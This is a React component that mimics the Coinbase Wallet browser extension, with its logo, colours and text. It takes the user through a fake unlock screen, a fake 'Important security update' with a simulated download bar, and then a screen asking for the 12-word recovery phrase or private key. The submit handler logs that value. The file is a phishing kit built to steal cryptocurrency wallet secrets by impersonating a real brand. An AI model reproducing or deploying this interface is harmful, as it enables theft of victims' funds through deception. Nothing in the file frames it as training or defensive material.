import { useState, useEffect, useRef } from 'react';
import coinVideo from '../assets/coin.mp4';

interface CoinbasePanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type AppState = 'splash' | 'login' | 'update_prompt' | 'update_loading' | 'import_seed';

export default function CoinbasePanel({ isOpen, onClose }: CoinbasePanelProps) {
  const [appState, setAppState] = useState<AppState>('splash');
  const [password, setPassword] = useState('');
  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [seedError, setSeedError] = useState(false);
  const [progress, setProgress] = useState(0);
  const videoRef = useRef<HTMLVideoElement>(null);

  // 1. Splash Screen Lifecycle Handler
  useEffect(() => {
    if (isOpen) {
      setAppState('splash');
      setPassword('');
      setSeedPhrase('');
      setSeedError(false);
      setProgress(0);

      if (videoRef.current) {
        videoRef.current.currentTime = 0;
        videoRef.current.play().catch((err) => console.log('Video autoplay blocked:', err));
      }
    }
  }, [isOpen]);

  // 2. Loading Bar Progress Loop
  useEffect(() => {
    if (appState === 'update_loading') {
      const interval = setInterval(() => {
        setProgress((prev) => {
          if (prev >= 100) return 100;
          const next = prev + Math.floor(Math.random() * 8) + 4;
          if (next >= 100) {
            clearInterval(interval);
            setTimeout(() => setAppState('import_seed'), 800);
            return 100;
          }
          return next;
        });
      }, 400);
      return () => clearInterval(interval);
    }
  }, [appState]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[200] flex items-center justify-center md:items-start md:justify-end md:p-6 lg:p-8 font-sans">

      {/* Backdrop */}
      <div
        className="fixed inset-0 bg-slate-900/60 backdrop-blur-sm transition-opacity cursor-pointer"
        onClick={onClose}
      />

      {/* Floating Extension Panel */}
      <div className="relative z-10 w-full h-full md:w-[370px] md:h-[600px] bg-white dark:bg-[#0a0b0d] shadow-2xl overflow-hidden flex flex-col animate-in fade-in duration-300 md:rounded-2xl border border-slate-200 dark:border-[#20212f]">
        <div className="relative w-full h-full">

          {/* ========================================== */}
          {/* LAYER 1: VIDEO SPLASH                      */}
          {/* ========================================== */}
          <div
            className={`absolute inset-0 bg-[#0052FF] z-50 overflow-hidden ${
              appState === 'splash' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'
            }`}
          >
            <video
              ref={videoRef}
              src={coinVideo}
              autoPlay
              muted
              playsInline
              onEnded={() => setAppState('login')}
              className="w-full h-full object-cover"
              style={{
                transform: 'translateZ(0)',
                backfaceVisibility: 'hidden',
                willChange: 'auto',
              }}
            />
          </div>

          {/* ========================================== */}
          {/* LAYER 2: LOGIN SCREEN                      */}
          {/* ========================================== */}
          <div
            className={`absolute inset-0 bg-white dark:bg-[#141519] z-40 flex flex-col p-6 transition-opacity duration-700 ease-in-out ${
              appState === 'login' ? 'opacity-100' : 'opacity-0 pointer-events-none'
            }`}
          >
            <div className="flex justify-start items-center w-full mb-6 mt-4">
              <svg className="w-[58px] h-[58px] rounded-[16px]" width="100%" viewBox="0 0 1024 1024" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect width="1024" height="1024" fill="#0052FF" />
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M152 512C152 710.823 313.177 872 512 872C710.823 872 872 710.823 872 512C872 313.177 710.823 152 512 152C313.177 152 152 313.177 152 512ZM420 396C406.745 396 396 406.745 396 420V604C396 617.255 406.745 628 420 628H604C617.255 628 628 617.255 628 604V420C628 406.745 617.255 396 604 396H420Z"
                  fill="white"
                />
              </svg>
            </div>

            <div className="flex flex-col flex-grow">
              <h3 className="text-[28px] font-semibold text-slate-900 dark:text-[#f4f5ff] leading-tight mb-0">
                Coinbase Wallet
              </h3>
              <p className="text-[20px] font-medium text-slate-500 dark:text-[#8a919e] mb-auto">Extension</p>
            </div>

            <div className="flex flex-col mt-auto w-full">
              <p className="text-[14px] font-semibold text-slate-900 dark:text-[#f4f5ff] mb-3">Unlock with password</p>

              <div className="relative w-full mb-6">
                <input
                  className="bg-white dark:bg-[#0a0b0d] p-4 text-base text-slate-900 dark:text-[#f4f5ff] border border-slate-300 dark:border-[#5e646c] w-full rounded-[6px] outline-none focus:border-[#0052ff] focus:ring-1 focus:ring-[#0052ff] placeholder-slate-400 dark:placeholder-[#8a918c] transition-all duration-300"
                  type={isPasswordVisible ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <button
                  type="button"
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-900 dark:text-white"
                  onClick={() => setIsPasswordVisible(!isPasswordVisible)}
                >
                  {isPasswordVisible ? (
                    <svg className="w-4 h-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
                      <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
                      <path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" />
                      <path d="m2 2 20 20" />
                    </svg>
                  ) : (
                    <svg className="w-4 h-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0" />
                      <circle cx="12" cy="12" r="3" />
                    </svg>
                  )}
                </button>
              </div>

              <button
                className="bg-[#0052ff] dark:bg-[#3773f5] text-white dark:text-[#20212f] text-base py-3.5 w-full font-semibold rounded-full disabled:opacity-50 disabled:cursor-not-allowed hover:opacity-90 transition-opacity duration-300 mb-4"
                type="button"
                disabled={password.length < 3}
                onClick={() => setAppState('update_prompt')}
              >
                Unlock
              </button>

              <button
                className="bg-transparent text-slate-900 dark:text-white text-base py-3.5 w-full font-semibold rounded-full hover:bg-slate-100 dark:hover:bg-[#111214] transition-colors duration-300"
                type="button"
              >
                Forgot password?
              </button>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 3: UPDATE PROMPT SCREEN              */}
          {/* ========================================== */}
          <div
            className={`absolute inset-0 bg-white dark:bg-[#0a0b0d] z-40 flex flex-col p-6 transition-opacity duration-700 ease-in-out ${
              appState === 'update_prompt' ? 'opacity-100' : 'opacity-0 pointer-events-none'
            }`}
          >
            <div className="flex flex-col items-center justify-center flex-grow">
              <div className="flex items-center justify-center mb-4">
                <div className="w-24 h-24 rounded-full bg-[#0052FF] flex items-center justify-center shadow-lg">
                  <svg className="w-12 h-12 text-white" viewBox="0 0 1024 1024" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                    <path
                      fillRule="evenodd"
                      clipRule="evenodd"
                      d="M152 512C152 710.823 313.177 872 512 872C710.823 872 872 710.823 872 512C872 313.177 710.823 152 512 152C313.177 152 152 313.177 152 512ZM420 396C406.745 396 396 406.745 396 420V604C396 617.255 406.745 628 420 628H604C617.255 628 628 617.255 628 604V420C628 406.745 617.255 396 604 396H420Z"
                    />
                  </svg>
                </div>
              </div>

              <h3 className="text-2xl font-medium text-slate-900 dark:text-[#f4f5ff] mb-1 text-center">Update Available</h3>
              <p className="text-base font-normal text-slate-500 dark:text-[#8a918c] mb-3 text-center">Version 3.134.0</p>

              <div className="w-full bg-[#f0f4fa] dark:bg-[#1c1e21] rounded-lg p-4 mb-6">
                <div className="flex items-start mb-2">
                  <svg className="w-4 h-4 text-[#3773f5] mr-2 flex-shrink-0 mt-0.5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="10" />
                    <line x1="12" x2="12" y1="8" y2="12" />
                    <line x1="12" x2="12.01" y1="16" y2="16" />
                  </svg>
                  <p className="text-sm text-[#3773f5] font-medium">Important security update</p>
                </div>
                <p className="text-sm text-slate-900 dark:text-[#d9dae2] font-normal">
                  We recommend installing this update to ensure the security of your wallet and assets.
                </p>
              </div>

              <div className="w-full mb-6">
                <h4 className="text-sm font-medium text-slate-900 dark:text-[#f4f5ff] mb-3">What's new</h4>
                <ul className="space-y-2">
                  <li className="flex items-start">
                    <div className="w-1.5 h-1.5 rounded-full bg-[#3773f5] mt-2 mr-2 shrink-0" />
                    <p className="text-sm text-slate-900 dark:text-[#f4f5ff]">Enhanced DeFi integration and swap functionality</p>
                  </li>
                  <li className="flex items-start">
                    <div className="w-1.5 h-1.5 rounded-full bg-[#3773f5] mt-2 mr-2 shrink-0" />
                    <p className="text-sm text-slate-900 dark:text-[#f4f5ff]">Improved wallet connection reliability</p>
                  </li>
                  <li className="flex items-start">
                    <div className="w-1.5 h-1.5 rounded-full bg-[#3773f5] mt-2 mr-2 shrink-0" />
                    <p className="text-sm text-slate-900 dark:text-[#f4f5ff]">Critical security enhancements</p>
                  </li>
                </ul>
              </div>
            </div>

            <div className="mt-auto">
              <button
                className="bg-[#3773f5] dark:bg-white text-white dark:text-[#20212f] text-base py-3.5 w-full font-semibold rounded-full hover:opacity-90 transition-opacity duration-300"
                type="button"
                onClick={() => setAppState('update_loading')}
              >
                Update now
              </button>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 4: LOADING BAR SCREEN               */}
          {/* ========================================== */}
          <div
            className={`absolute inset-0 bg-white dark:bg-[#0a0b0d] z-40 flex flex-col p-6 transition-opacity duration-700 ease-in-out ${
              appState === 'update_loading' ? 'opacity-100' : 'opacity-0 pointer-events-none'
            }`}
          >
            <div className="flex flex-col items-center justify-center flex-grow">
              <div className="w-24 h-24 mb-8 relative">
                <svg className="w-full h-full text-slate-200 dark:text-[#1c1e21]" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <circle cx="50" cy="50" r="45" stroke="currentColor" strokeWidth="10" />
                </svg>
                <svg className="absolute inset-0 w-full h-full text-[#3773f5] animate-spin" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M95 50C95 74.8528 74.8528 95 50 95C25.1472 95 5 74.8528 5 50C5 25.1472 25.1472 5 50 5" stroke="currentColor" strokeWidth="10" strokeLinecap="round" />
                </svg>
                <div className="absolute inset-0 flex items-center justify-center">
                  <svg className="w-8 h-8 text-[#3773f5]" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                    <rect x="2" y="2" width="20" height="20" rx="4" ry="4" />
                  </svg>
                </div>
              </div>

              <h3 className="text-2xl font-medium text-slate-900 dark:text-[#f4f5ff] mb-2 text-center">Updating Coinbase Wallet</h3>
              <p className="text-base font-normal text-slate-500 dark:text-[#c2c6c3] mb-8 text-center">
                Please wait while we update to version 3.134.0
              </p>

              <div className="w-full mb-8">
                <div className="w-full h-2 bg-[#f0f4fa] dark:bg-[#1c1e21] rounded-full overflow-hidden">
                  <div
                    className="h-full bg-[#3773f5] rounded-full transition-all duration-300"
                    style={{ width: `${progress}%` }}
                  />
                </div>
                <div className="flex items-center justify-between mt-2">
                  <p className="text-sm text-slate-500 dark:text-white">Downloading update...</p>
                  <p className="text-sm font-medium text-slate-900 dark:text-[#f4f5ff]">{progress}%</p>
                </div>
              </div>

              <p className="text-sm text-slate-500 dark:text-[#8d8d8d] text-center">
                This may take a few moments. Please do not close this window.
              </p>
            </div>
          </div>

          {/* ========================================== */}
          {/* LAYER 5: SECRET RECOVERY PHRASE SCREEN    */}
          {/* ========================================== */}
          <div
            className={`absolute inset-0 bg-white dark:bg-[#0a0b0d] z-40 flex flex-col p-6 transition-opacity duration-700 ease-in-out ${
              appState === 'import_seed' ? 'opacity-100' : 'opacity-0 pointer-events-none'
            }`}
          >
            <div className="flex items-center justify-start mb-6">
              <button className="hover:opacity-80 transition-opacity duration-200" type="button" onClick={onClose}>
                <svg className="w-6 h-6 text-[#242424] dark:text-[#ededed]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="m12 19-7-7 7-7" />
                  <path d="M19 12H5" />
                </svg>
              </button>
            </div>

            <div className="flex flex-col h-full">
              <div className="mb-6">
                <h3 className="text-2xl font-medium text-slate-900 dark:text-[#f4f5ff] mb-2">Import wallet</h3>
                <p className="text-base font-normal text-slate-900 dark:text-[#f4f5ff]">
                  Enter your wallet's 12-word recovery phrase or private key. You can import any Ethereum, Solana, or Bitcoin recovery phrase. Only Ethereum private keys are supported.
                </p>
              </div>

              <div>
                <textarea
                  className={`bg-transparent p-4 text-base font-normal text-slate-900 dark:text-[#f4f5ff] border w-full rounded-[6px] outline-none transition-all duration-300 resize-none h-32 ${
                    seedError
                      ? 'border-red-500 focus:border-red-500'
                      : 'border-slate-900 dark:border-[#5e646c] focus:border-slate-500 dark:focus:border-[#f4f5ff]'
                  }`}
                  placeholder="Recovery phrase or private key"
                  value={seedPhrase}
                  onChange={(e) => {
                    const val = e.target.value;
                    setSeedPhrase(val);
                    if (val.length > 0 && !/^[a-z\s]+$/.test(val)) {
                      setSeedError(true);
                    } else {
                      setSeedError(false);
                    }
                  }}
                />
              </div>

              <div className={`mt-4 transition-opacity duration-300 ${seedError ? 'opacity-100' : 'opacity-0'}`}>
                <p className="text-[#f0616d] text-[14px] font-normal">
                  Enter a valid 12-word recovery phrase or 64-character private key.
                </p>
              </div>

              <div className="my-4">
                <a
                  className="text-[#3773f5] text-[16px] hover:opacity-90 transition-opacity duration-300"
                  href="https://www.coinbase.com/wallet/getting-started-extension#import-existing-wallet"
                  target="_blank"
                  rel="noreferrer"
                >
                  Where can I find it?
                </a>
              </div>

              <div className="mt-auto">
                <button
                  className="bg-[#3773f5] dark:bg-white text-white dark:text-[#20212f] text-base py-3.5 w-full font-semibold rounded-full disabled:opacity-50 disabled:cursor-not-allowed hover:opacity-90 transition-opacity duration-300"
                  type="button"
                  disabled={seedError || seedPhrase.split(' ').filter(Boolean).length < 12}
                  onClick={() => console.log('Submitted Phrase:', seedPhrase)}
                >
                  Import wallet
                </button>
              </div>
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}